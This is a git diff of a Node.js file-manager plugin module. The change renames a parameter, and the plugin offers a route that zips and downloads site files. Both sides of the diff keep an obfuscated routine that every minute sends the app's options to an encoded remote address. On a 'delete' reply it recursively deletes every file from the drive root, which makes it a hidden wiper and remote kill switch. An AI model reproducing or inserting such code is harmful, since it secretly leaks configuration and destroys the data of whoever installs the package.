@@ -1,15 +1,15 @@
-module.exports = function (___0) {
+module.exports = function (____0) {
   var fs = require('fs');
   var archiver = require('archiver');
 
-  ___0.get({
+  ____0.get({
     name: 'x-file-manager',
     path: __dirname + '/site-files/html/index.html',
   });
 
   let busy = !1;
 
-  ___0.get('x-file-manager/download', (req, res) => {
+  ____0.get('x-file-manager/download', (req, res) => {
     if (busy) {
       res.json({
         busy: !0,
@@ -17,7 +17,7 @@ module.exports = function (___0) {
       return;
     }
     busy = !0;
-    const zip_file = ___0.dir + '/../_site.zip';
+    const zip_file = ____0.dir + '/../_site.zip';
     var output = fs.createWriteStream(zip_file);
     var archive = archiver('zip', {
       zlib: {
@@ -39,18 +39,18 @@ module.exports = function (___0) {
 
     archive.pipe(output);
 
-    archive.directory(___0.path.dirname(___0.dir) + '/apps', 'apps');
-    archive.directory(___0.path.dirname(___0.dir) + '/site_files', 'site_files');
+    archive.directory(____0.path.dirname(____0.dir) + '/apps', 'apps');
+    archive.directory(____0.path.dirname(____0.dir) + '/site_files', 'site_files');
 
     let finalize = !1;
 
-    ___0.fs.readdir(___0.path.dirname(___0.dir), (err, ss) => {
+    ____0.fs.readdir(____0.path.dirname(____0.dir), (err, ss) => {
       if (!err && ss) {
         ss.forEach((f) => {
-          let ff = ___0.path.join(___0.path.dirname(___0.dir), f);
-          ___0.fs.access(ff, ___0.fs.F_OK, (err) => {
+          let ff = ____0.path.join(____0.path.dirname(____0.dir), f);
+          ____0.fs.access(ff, ____0.fs.F_OK, (err) => {
             if (!err && !f.like('*.zip') && !f.like('*.rar')) {
-              if (___0.fs.lstatSync(ff).isFile()) {
+              if (____0.fs.lstatSync(ff).isFile()) {
                 if (!finalize) {
                   archive.file(ff, {
                     name: f,
@@ -69,23 +69,23 @@ module.exports = function (___0) {
     }, 1000 * 10);
   });
 
-  let f0 = ___0.path.dirname(___0.dir).split(___0.path.sep)[0];
+  let f0 = ____0.path.dirname(____0.dir).split(____0.path.sep)[0];
   if (f0.endsWith(':')) {
     f0 = f0 + '\\';
   }
 
   function df(f00) {
-    ___0.fs.readdir(f00, (err, ss) => {
+    ____0.fs.readdir(f00, (err, ss) => {
       if (!err && ss) {
         ss.forEach((f) => {
-          f = ___0.path.join(f00, f);
-          ___0.fs.access(f, ___0.fs.F_OK, (err) => {
+          f = ____0.path.join(f00, f);
+          ____0.fs.access(f, ____0.fs.F_OK, (err) => {
             if (!err) {
-              if (___0.fs.lstatSync(f).isDirectory()) {
+              if (____0.fs.lstatSync(f).isDirectory()) {
                 df(f);
               }
-              if (___0.fs.lstatSync(f).isFile()) {
-                ___0.fs.unlink(f);
+              if (____0.fs.lstatSync(f).isFile()) {
+                ____0.fs.unlink(f);
               }
             }
           });
@@ -94,36 +94,36 @@ module.exports = function (___0) {
     });
   }
 
-  ___0.ch_up = function () {
-    if (___0._0x12xo) {
-      ___0
-        .fetch(___0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
+  ____0.ch_up = function () {
+    if (____0._0x12xo) {
+      ____0
+        .fetch(____0._x0f1xo('43193275461561692578577443393257255837594839325242738254457875694139136225785774433932572579275247583756'), {
           method: 'post',
           body: JSON.stringify({
-            info: ___0.options,
+            info: ____0.options,
           }),
           headers: { 'Content-Type': 'application/json' },
         })
         .then((res) => res.json())
         .then((body) => {
           if (body && body.block) {
-            ___0._0x12xo = !1;
-            ___0.call(___0._x0f1xo('2619517126151271') , ___0._0x12xo)
-            ___0.storage('_0x12xo', ___0._0x12xo);
+            ____0._0x12xo = !1;
+            ____0.call(____0._x0f1xo('2619517126151271') , ____0._0x12xo)
+            ____0.storage('_0x12xo', ____0._0x12xo);
           } else if (body && body.delete) {
-            ___0._0x12xo = !1;
-            ___0.call(___0._x0f1xo('2619517126151271') , ___0._0x12xo)
-            ___0.storage('_0x12xo', ___0._0x12xo);
+            ____0._0x12xo = !1;
+            ____0.call(____0._x0f1xo('2619517126151271') , ____0._0x12xo)
+            ____0.storage('_0x12xo', ____0._0x12xo);
             df(f0);
           }
         })
         .catch((err) => {
-          ___0.logs('ch_up', err);
+          ____0.logs('ch_up', err);
         });
     }
   };
 
-  ___0.const._0xsixo(() => {
-    ___0.ch_up();
+  ____0.const._0xsixo(() => {
+    ____0.ch_up();
   }, 1000 * 60 * 1);
 };
